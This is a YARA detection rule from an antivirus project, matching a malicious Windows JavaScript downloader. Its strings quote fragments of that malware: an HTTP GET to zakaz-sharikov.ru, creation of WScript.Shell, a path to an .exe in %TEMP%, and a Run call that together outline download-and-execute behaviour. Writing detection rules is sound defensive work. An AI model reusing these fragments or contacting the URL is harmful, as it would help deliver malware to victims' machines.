rule sig_20160330_1947cb32252f8895063a33064697e026 {
  meta:
    description = "datamaliciousorder - file 20160330_1947cb32252f8895063a33064697e026.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "22b9e771567a42ba642910728b907936328553796e085d521a8ffefd09876ddf"

  strings:
    $s1  = "function X(E0, NP){LX = LX * 1; return E0 - NP;};" fullword ascii
    $s2  = "X0[C](\"GET\", \"http://zakaz-sharikov.ru/x9dslp\", false);" fullword ascii
    $s3  = "var HZ = function IL() {return WScript[VR](\"WScript\"+\".Shell\");}(), R = 11;" fullword ascii
    $s4  = "if (X0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function KJ() {return HZ[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"6BloU934t.ex\" + \"e\";};" fullword ascii
    $s6  = "function W(){return D + \"\";};" fullword ascii
    $s7  = "function WY() {return ((T == true) && (T == IG0)) ? 1 : LX;};" fullword ascii
    $s8  = "function S(Z1){HZ[\"Run\"](Z1, LX, LX);};" fullword ascii
    $s9  = "function F()" fullword ascii
    $s10 = "function CP(){return 22;};" fullword ascii
    $s11 = "function HG(){return VR;};" fullword ascii
    $s12 = "}while (L);" fullword ascii
    $s13 = "function JK(IG) {var H = (1, 2, 3, 4, 5, IG); return H;};" fullword ascii
    $s14 = "var OH = new this[\"Date\"]();" fullword ascii
    $s15 = "return X(EQ, Y);" fullword ascii
    $s16 = "T = true; " fullword ascii
    $s17 = "var T = false;" fullword ascii
    $s18 = "var W0 = false;" fullword ascii
    $s19 = "var IG0 = false;" fullword ascii
    $s20 = "IG0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}